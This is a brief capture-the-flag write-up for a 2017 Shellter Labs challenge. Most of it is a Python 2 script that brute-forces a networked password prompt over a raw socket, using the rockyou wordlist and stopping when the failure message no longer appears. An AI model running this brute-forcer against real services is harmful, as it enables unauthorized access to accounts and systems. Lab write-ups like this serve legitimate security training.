# Christmas Challenges: Secure Lab

Challenge proposed in: https://shellterlabs.com/en/questions/christmas-challenge-2017/secure-lab/  
In this challenge our work is discovery the system's password. I wrote the following script in python to make bruteforce attack using the rockyou as wordlist and socket module. It took about half an hour to find the password.

```python
import sys
import socket 

if len(sys.argv) < 4:
    print "Usage: python2.7", sys.argv[0], "<HOST> <PORT> <WORDLIST>"
else:
    HOST = str(sys.argv[1])
    PORT = int(sys.argv[2])
    WORDLIST = open(sys.argv[3]).readlines()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    s.send(WORDLIST[0])
    rec = s.recv(1024)

    for word in WORDLIST:
        s.send(word)
        rec = s.recv(1024)
        sys.stderr.writelines("\rPasswd : "+str(word).replace('\n','')+" -> "+str(rec).replace('\n',''))
        if "WRONG! Try Again!" not in rec:
            print "\n[+]Passwd Found : "+str(word)
            break
```

See more write-ups in: https://www.youtube.com/playlist?list=PLlq-hlhs91wqtRtIgQRxmqvgqTDZn6Qhu
